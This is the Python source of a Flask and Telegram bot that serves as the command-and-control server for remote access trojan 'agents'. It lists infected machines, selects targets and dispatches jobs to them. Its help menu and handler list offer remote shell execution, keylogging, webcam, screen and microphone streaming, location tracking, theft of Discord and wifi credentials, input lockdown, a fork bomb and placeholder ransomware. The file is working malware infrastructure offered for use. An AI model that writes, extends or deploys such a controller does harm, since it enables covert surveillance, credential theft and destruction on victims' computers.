# app.py (v43.0_PAGINATION_UPDATE)
# - MODIFIED: Implemented pagination for the /list command to handle a large number of agents without hitting Telegram's message limit.

import os
import re
import json
import uuid
import httpx
import asyncio
import traceback
import base64
import time
import html
from datetime import datetime
from flask import Flask, request, Response

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# --- Configuration ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
SECRET_TOKEN = os.getenv("SECRET_TOKEN")
JOBS_URL = os.getenv("JOBS_URL")
STATE_URL = os.getenv("STATE_URL")
HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")

# --- Initialize Flask and the Telegram Bot Application ---
app = Flask(__name__)
ptb_app = Application.builder().token(TOKEN).build()

# --- Helper Functions ---
def esc(text):
    """Escapes characters for Telegram's MarkdownV2 parser."""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))

async def make_async_request(method, url, json_data=None, retries=3, delay=2):
    """A robust helper for making async HTTP requests with retries."""
    if not url: print("Error: URL is not set."); return None
    async with httpx.AsyncClient() as client:
        for attempt in range(retries):
            try:
                res = await client.request(method.upper(), url, json=json_data, timeout=10)
                res.raise_for_status()
                if not res.text: return []
                return res.json()
            except httpx.RequestError as e: print(f"Attempt {attempt + 1}/{retries}: Network error for {url}: {e}"); await asyncio.sleep(delay)
            except json.JSONDecodeError: print(f"Warning: Data at {url} is not valid JSON. Treating as empty."); return []
            except Exception as e: print(f"Attempt {attempt + 1}/{retries}: Unexpected error for {url}: {e}"); return None
    print(f"Failed to connect to {url} after {retries} attempts."); return None

async def get_state():
    data = await make_async_request('GET', STATE_URL)
    return data.get("selected_target") if data else None

async def set_state(target_id):
    return await make_async_request('POST', STATE_URL, json_data={"selected_target": target_id})

async def post_job(target_id, command, args):
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    current_jobs = await make_async_request('GET', JOBS_URL)
    if current_jobs is None or not isinstance(current_jobs, list): current_jobs = []
    current_jobs.append(job)
    return await make_async_request('POST', JOBS_URL, json_data=current_jobs)

# --- Telegram Command Handlers ---

async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 1
    if context.args:
        try:
            page = int(context.args[0])
            if page < 1: page = 1
        except (ValueError, IndexError):
            await update.message.reply_text("Invalid page number. Please use a number like <code>/list 2</code>.", parse_mode=ParseMode.HTML)
            return
            
    await update.message.reply_text("⏳ Fetching active agents...")
    try:
        if not HEARTBEAT_URL:
            await update.message.reply_text("<b>Configuration Error:</b> <code>HEARTBEAT_URL</code> is not set on the server.", parse_mode=ParseMode.HTML)
            return

        agents = await make_async_request('GET', HEARTBEAT_URL)
        selected_target = await get_state()
        
        if agents is None:
            await update.message.reply_text("<b>Connection Error:</b> Could not connect to the heartbeat URL.", parse_mode=ParseMode.HTML)
            return
        
        if not isinstance(agents, list):
            await update.message.reply_text("<b>Data Error:</b> Heartbeat data is not a valid list.", parse_mode=ParseMode.HTML)
            return

        current_time_unix = time.time()
        online_agents = sorted(
            [agent for agent in agents if current_time_unix - agent.get("timestamp", 0) <= 90],
            key=lambda x: x.get('timestamp', 0),
            reverse=True
        )

        total_agents = len(online_agents)
        if total_agents == 0:
            await update.message.reply_text("<i>No agents are currently online.</i>", parse_mode=ParseMode.HTML)
            return

        agents_per_page = 15
        total_pages = (total_agents + agents_per_page - 1) // agents_per_page

        if page > total_pages:
            await update.message.reply_text(f"Invalid page number. There are only {total_pages} pages.", parse_mode=ParseMode.HTML)
            return

        start_index = (page - 1) * agents_per_page
        end_index = start_index + agents_per_page
        agents_to_display = online_agents[start_index:end_index]

        response_text = f"<b>ONLINE AGENTS (Page {page} of {total_pages})</b>\n\n"
        for agent in agents_to_display:
            is_selected = "🎯" if agent.get("id") == selected_target else "➖"
            seconds_ago = int(current_time_unix - agent.get("timestamp", 0))
            time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
            is_admin = "Admin" if agent.get("is_admin") else "User"
            agent_id = agent.get('id', 'N/A')
            user = agent.get('user', 'N/A')
            
            safe_id = html.escape(agent_id)
            safe_user = html.escape(user)
            
            response_text += f"{is_selected} <b>ID:</b> <code>{safe_id}</code>\n"
            response_text += f"   <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
            response_text += f"   <b>Last Seen:</b> {time_ago}\n\n"

        if page < total_pages:
            response_text += f"\n<i>To see the next page, type <code>/list {page + 1}</code></i>"
        
        await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)

    except Exception as e:
        await update.message.reply_text(f"❌ An unexpected server-side error occurred: <pre>{html.escape(str(e))}</pre>", parse_mode=ParseMode.HTML)
        print(f"Error in /list command: {traceback.format_exc()}")


async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: `/target <id|all|clear>`", parse_mode=ParseMode.MARKDOWN_V2); return
    target_id = context.args[0]
    if target_id.lower() == 'clear': target_id = None
    if await set_state(target_id): await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`" if target_id else "✅ Target cleared.", parse_mode=ParseMode.MARKDOWN_V2)
    else: await update.message.reply_text("❌ Failed to set target.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 2 or context.args[1].upper() != 'CONFIRM':
        await update.message.reply_text("⚠️ *DANGER:* This is irreversible\\. Use: `/destroy <id> CONFIRM`", parse_mode=ParseMode.MARKDOWN_V2); return
    target_id = context.args[0]
    if await post_job(target_id, "destroy", ""): await update.message.reply_text(f"✅ Self-destruct command sent to agent `{esc(target_id)}`\\.", parse_mode=ParseMode.MARKDOWN_V2)
    else: await update.message.reply_text("❌ Error: Failed to dispatch destroy command\\.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_target = await get_state()
    if not selected_target: await update.message.reply_text("❌ No target selected\\. Use `/target <id>` first\\.", parse_mode=ParseMode.MARKDOWN_V2); return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❓ **How to use:** Reply to a file with `/upload` to send it.", parse_mode=ParseMode.MARKDOWN_V2); return
    try:
        doc = update.message.reply_to_message.document; file = await doc.get_file()
        file_content = await file.download_as_bytearray(); file_b64 = base64.b64encode(file_content).decode('utf-8')
        args_dict = {"filename": doc.file_name, "file_data_b64": file_b64}
        if await post_job(selected_target, "upload", json.dumps(args_dict)): await update.message.reply_text(f"✅ Upload job for `{esc(doc.file_name)}` dispatched to `{esc(selected_target)}`\\.", parse_mode=ParseMode.MARKDOWN_V2)
        else: await update.message.reply_text("❌ Error: Failed to dispatch upload job\\.", parse_mode=ParseMode.MARKDOWN_V2)
    except Exception as e: await update.message.reply_text(f"❌ An error occurred during upload: `{esc(str(e))}`", parse_mode=ParseMode.MARKDOWN_V2)

async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_target = await get_state()
    if not selected_target: await update.message.reply_text("❌ No target selected\\. Use `/target <id>` first\\.", parse_mode=ParseMode.MARKDOWN_V2); return
    command = update.message.text.split(' ')[0][1:]; args = " ".join(context.args)
    if await post_job(selected_target, command, args): await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to `{esc(selected_target)}`\\.", parse_mode=ParseMode.MARKDOWN_V2)
    else: await update.message.reply_text("❌ Error: Failed to dispatch job\\.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "<b>AGENT CONTROLLER HELP MENU</b>\n\n"
        "---------------------------------\n"
        "<b>🎯 CORE COMMANDS</b>\n"
        "<code>/list</code> - Show all active agents\n"
        "<code>/target &lt;id|all|clear&gt;</code> - Set the active agent\n"
        "<code>/help</code> - Display this help menu\n\n"
        "<b>💻 SYSTEM & INFO</b>\n"
        "<code>/info</code> - Get system info\n"
        "<code>/getexactlocation</code> - 📍 Get precise location via browser\n"
        "<code>/exec &lt;command&gt;</code> - Execute a shell command\n\n"
        "<b>👁️ SURVEILLANCE</b>\n"
        "<code>/ss</code> - Take a screenshot\n"
        "<code>/cam</code> - Take a webcam photo\n"
        "<code>/startkeylogger</code> - Begin capturing keystrokes\n"
        "<code>/stopkeylogger</code> - Stop and upload keylog\n\n"
        "<b>🔴 LIVE STREAMING</b>\n"
        "<code>/livestream</code> - Start a live screen stream\n"
        "<code>/stoplivestream</code> - Stop the screen stream\n"
        "<code>/livecam</code> - Start a live webcam stream\n"
        "<code>/stoplivecam</code> - Stop the webcam stream\n"
        "<code>/livemic</code> - Start live microphone audio stream\n"
        "<code>/stoplivemic</code> - Stop the audio stream\n\n"
        "<b>💬 LIVE INTERACTION</b>\n"
        "<code>/startchat</code> - Open a chat box on the user's screen\n"
        "<code>/sendchat &lt;message&gt;</code> - Send a message to the chat box\n"
        "<code>/stopchat</code> - Close the chat box\n\n"
        "<b>🔊 MISCHIEF</b>\n"
        "<code>/tts &lt;male|female&gt; &lt;msg&gt;</code> - Play Text-to-Speech\n"
        "<code>/flashscreen &lt;effect&gt;</code> - Apply visual screen glitch\n"
        "  <i>Effects: invert, noise, lines, color_squares</i>\n"
        "<code>/stopflashscreen</code> - Stop the visual effect\n"
        "<code>/jumpscare</code> - 👻 Run the bundled jumpscare executable\n\n"
        "<b>🚫 LOCKDOWN & CONTROL (Admin)</b>\n"
        "<code>/blockwebsite &lt;url&gt;</code> - Block website access\n"
        "<code>/unblockwebsite &lt;domain&gt;</code> - Unblock a website\n"
        "<code>/blockkeyboard</code> - Disable keyboard input\n"
        "<code>/unblockkeyboard</code> - Enable keyboard input\n"
        "<code>/blockmouse</code> - Disable mouse input\n"
        "<code>/unblockmouse</code> - Enable mouse input\n\n"
        "<b>🔑 DATA EXFILTRATION</b>\n"
        "<code>/grab &lt;type&gt;</code> - Steal data (discord, wifi,)\n"
        "  <i>Types: all, discord, wifi</i>\n\n"
        "<b>📁 FILE SYSTEM</b>\n"
        "<code>/ls</code> - List files\n"
        "<code>/cd &lt;dir&gt;</code> - Change directory\n"
        "<code>/pwd</code> - Show current directory\n"
        "<code>/download &lt;file&gt;</code> - Download a file from the agent\n"
        "<code>/upload</code> - Reply to a file to upload it\n\n"
        "<b>💣 DESTRUCTIVE & ADVANCED (Admin)</b>\n"
        "<code>/forkbomb</code> - ⚠️ Rapidly spawns processes\n"
        "<code>/cancelforkbomb</code> - Stop the fork bomb\n"
        "<code>/destroy &lt;id&gt; CONFIRM</code> - Uninstall the agent\n"
        "<code>/ransomware</code> - ☢️ Deploys placeholder ransomware\n"
        "<code>/restore &lt;key&gt;</code> - Placeholder restore command\n"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)

# --- Register all command handlers ---
ptb_app.add_handler(CommandHandler("help", cmd_help))
ptb_app.add_handler(CommandHandler("list", cmd_list_agents))
ptb_app.add_handler(CommandHandler("target", cmd_target))
ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
ptb_app.add_handler(CommandHandler("upload", cmd_upload))

agent_commands = ["info", "exec", "ss", "cam", "getexactlocation", "startkeylogger", "stopkeylogger", "livestream", "stoplivestream", "livecam", "stoplivecam", "livemic", "stoplivemic", "grab", "ls", "cd", "download", "pwd", "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse", "forkbomb", "cancelforkbomb", "ransomware", "restore", "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen", "jumpscare", "startchat", "sendchat", "stopchat"]
for cmd in agent_commands: ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# --- Main Webhook Endpoint ---
@app.route('/', methods=['POST'])
def process_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN: return Response('Unauthorized', status=403)
    asyncio.run(process_update_async(request.get_json(force=True))); return Response('OK', status=200)

async def process_update_async(update_data):
    try:
        async with ptb_app: await ptb_app.process_update(Update.de_json(update_data, ptb_app.bot))
    except Exception as e: print(f"Error processing update: {e}\n{traceback.format_exc()}")

@app.route('/', methods=['GET'])
def health_check(): return "Bot is running.", 200

if __name__ == '__main__': app.run(debug=True, port=os.getenv("PORT", 5000))
